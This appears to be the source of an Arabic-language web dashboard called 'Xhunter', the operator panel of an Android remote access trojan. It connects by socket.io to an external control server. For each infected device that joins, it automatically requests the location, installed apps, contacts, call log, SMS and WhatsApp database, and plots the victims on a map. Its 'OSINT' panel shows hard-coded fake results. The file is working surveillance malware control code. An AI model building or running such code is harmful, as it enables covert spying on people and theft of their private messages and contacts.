<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Xhunter Dashboard - متطور</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="/socket.io/socket.io.js"></script>
<style>
body { margin:0; font-family:'Segoe UI', Tahoma, sans-serif; background:#0b1a2e; color:#eee; direction:rtl; }
header { display:flex; justify-content:space-between; align-items:center; padding:10px 20px; background:#1b263b; }
header .logo h1 { margin:0; font-size:24px; color:#00ffcc; }
header .user-info { display:flex; align-items:center; gap:10px; font-weight:bold; }
header .user-info i { font-size:20px; color:#fff; }
.sidebar { width:220px; background:#1b263b; position:fixed; top:60px; bottom:0; overflow-y:auto; }
.sidebar-menu { list-style:none; margin:0; padding:0; }
.sidebar-menu li a { display:block; padding:12px; color:#ccc; text-decoration:none; transition:0.3s; }
.sidebar-menu li a.active, .sidebar-menu li a:hover { background:#00ffcc33; color:#fff; }
.main-content { margin-right:240px; padding:20px; }
.panel { display:none; }
.panel.active { display:block; }
.device-card { border:1px solid #00ffcc44; background:#1b263b; border-radius:8px; padding:10px; margin:10px 0; transition:0.3s; }
.device-card:hover { background:#162447; }
.device-header { display:flex; justify-content:space-between; cursor:pointer; align-items:center; }
.device-header h3 { margin:0; color:#00ffcc; }
.device-content { display:none; margin-top:10px; border-top:1px solid #00ffcc44; padding-top:5px; }
.device-content pre { background:#0a1a2b; padding:5px; border-radius:5px; overflow-x:auto; color:#eee; }
.logs { max-height:300px; overflow-y:auto; background:#111; padding:10px; border-radius:5px; }
#osintResults .result { background:#162447; padding:10px; margin:10px 0; border-radius:5px; }
#map { height:400px; border-radius:8px; margin-top:10px; }
</style>
</head>
<body>

<div class="container">
<header>
<div class="logo"><h1>Xhunter متطور</h1></div>
<div class="user-info">
<i class="fas fa-user-shield"></i> مدير النظام
<div id="connectionStatus"><i class="fas fa-sync-alt fa-spin"></i> جاري الاتصال...</div>
</div>
</header>

<aside class="sidebar">
<ul class="sidebar-menu">
<li><a href="#" class="active" data-tab="devices"><i class="fas fa-microchip"></i> الأجهزة</a></li>
<li><a href="#" data-tab="map"><i class="fas fa-map-marked-alt"></i> الخريطة</a></li>
<li><a href="#" data-tab="logs"><i class="fas fa-clipboard-list"></i> السجل</a></li>
<li><a href="#" data-tab="osint"><i class="fas fa-search"></i> OSINT</a></li>
</ul>
</aside>

<main class="main-content">

<section id="panel-devices" class="panel active">
<h2>الأجهزة المتصلة</h2>
<div id="devices-empty">لا توجد أجهزة متصلة</div>
<div id="devices"></div>
</section>

<section id="panel-map" class="panel">
<h2>الخريطة الاستخباراتية</h2>
<div id="map">تحميل الخريطة...</div>
</section>

<section id="panel-logs" class="panel">
<h2>سجل الأحداث</h2>
<div class="logs" id="logs"></div>
</section>

<section id="panel-osint" class="panel">
<h2>OSINT تلقائي لجميع الأجهزة</h2>
<div id="osintResults"></div>
</section>

</main>
</div>

<script>
const socket = io('https://projectd-vu1m.onrender.com',{ transports:['websocket'], reconnection:true });
socket.emit('adminJoin');
socket.on('connect', ()=>document.getElementById('connectionStatus').innerHTML='<i class="fas fa-check-circle" style="color:lime"></i> متصل');
socket.on('disconnect', ()=>document.getElementById('connectionStatus').innerHTML='<i class="fas fa-times-circle" style="color:red"></i> غير متصل');

let devices={};
let mapInitialized=false, map, markers={};

function addLog(msg){ const logs=document.getElementById('logs'); const div=document.createElement('div'); div.textContent=`[${new Date().toLocaleTimeString()}] ${msg}`; logs.appendChild(div); }

function refreshDevices(){
  const container=document.getElementById('devices');
  container.innerHTML='';
  const ids=Object.keys(devices);
  document.getElementById('devices-empty').style.display=ids.length?'none':'block';
  ids.forEach(id=>{
    const d=devices[id];
    const card=document.createElement('div'); card.className='device-card';
    card.innerHTML=`<div class="device-header"><h3>${id}</h3><i class="fas fa-chevron-down"></i></div>
    <div class="device-content">
    موديل: ${d.model||'غير معروف'}<br>IP: ${d.ip||'N/A'}<br>OS: ${d.platform||'N/A'}<br>اللغة: ${d.language||'N/A'}<br>شاشة: ${d.screen?d.screen.width+'x'+d.screen.height:'N/A'}
    <div class="card-section"><h4>البيانات المجمعة</h4><pre id="data-${id}">جارٍ جمع البيانات...</pre></div>
    <div class="card-section"><h4>نتائج OSINT</h4><pre id="osint-${id}">جارٍ جمع البيانات...</pre></div>
    </div>`;
    container.appendChild(card);

    // تفعيل خاصية التوسيع
    const header=card.querySelector('.device-header');
    const content=card.querySelector('.device-content');
    header.addEventListener('click', ()=>{ content.style.display=content.style.display==='block'?'none':'block'; });

  });
}

function addDevice(d){
  devices[d.id]=d; addLog(`جهاز متصل: ${d.id}`); refreshDevices();
  autoCollectData(d.id);
  runOSINT(d.id);
}

function removeDevice(id){ delete devices[id]; addLog(`جهاز مفصول: ${id}`); refreshDevices(); }

socket.on('join', addDevice);
socket.on('disconnectDevice', removeDevice);

function autoCollectData(id){
  const actions=['getLocation','getInstalledApps','getContacts','getCallLog','getSMS','downloadWhatsappDatabase'];
  actions.forEach(a=>socket.emit('request',{to:id,action:a}));
}

// استقبال نتائج الطلبات
socket.on('requestResult', payload=>{
  try{
    const obj=JSON.parse(payload);
    addLog(`طلب ${obj.action} → ${obj.to}: ${obj.ok?'نجاح':obj.reason||'فشل'}`);
    const pre=document.getElementById('data-'+obj.to);
    if(pre && obj.ok && obj.result){ pre.textContent=JSON.stringify(obj.result.data,null,2); }
    if(obj.action==='getLocation' && obj.ok && obj.result.data.lat && obj.result.data.lon){
      if(!mapInitialized){ map=L.map('map').setView([15.5,44],6); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{ attribution:'&copy; OpenStreetMap contributors' }).addTo(map); mapInitialized=true; }
      if(markers[obj.to]) markers[obj.to].setLatLng([obj.result.data.lat,obj.result.data.lon]);
      else markers[obj.to]=L.marker([obj.result.data.lat,obj.result.data.lon]).addTo(map).bindPopup(`<b>${obj.to}</b><br>${obj.result.data.address||''}`);
    }
  }catch(e){ console.error(e); }
});

// OSINT تلقائي لكل جهاز
function runOSINT(id){
  const res=document.getElementById('osint-'+id);
  const sources=[
    {name:'Google', result:`3 روابط مرتبطة بـ"${id}"`},
    {name:'LinkedIn', result:`ملف محتمل باسم "${id}"`},
    {name:'Twitter', result:`@${id.replace(/\s/g,'')}`},
    {name:'EmailLeakDB', result:`تم العثور على بريد محتمل: ${id}@example.com`}
  ];
  if(res) res.textContent=sources.map(s=>`${s.name}: ${s.result}`).join('\n');
}

// التبديل بين التابات
document.querySelectorAll('.sidebar-menu a').forEach(link=>{
  link.addEventListener('click', e=>{
    e.preventDefault();
    document.querySelectorAll('.sidebar-menu a').forEach(l=>l.classList.remove('active'));
    document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
    link.classList.add('active');
    document.getElementById('panel-'+link.dataset.tab).classList.add('active');
  });
});
</script>
</body>
</html>
